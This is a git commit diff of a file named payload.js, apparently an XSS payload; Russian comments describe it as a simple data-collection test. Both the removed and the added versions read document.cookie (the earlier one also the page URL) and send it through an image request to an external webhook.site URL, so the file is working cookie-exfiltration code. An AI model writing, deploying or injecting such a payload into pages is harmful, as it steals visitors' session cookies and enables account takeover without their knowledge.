0c359ece8c03a06d8b8290bacf227ac354c7ef27
Jesse228-web <chatgop112@gmail.com>
2026-02-19 15:05:15 +0000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,2 @@
-// Упрощенный скрипт для проверки сбора данных
-let testData = {
-    cookies: document.cookie,
-    url: window.location.href
-};
-new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?test=' + encodeURIComponent(JSON.stringify(testData));
+// Самый простой тест: отправляем только document.cookie
+new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?final_test=' + encodeURIComponent(document.cookie);
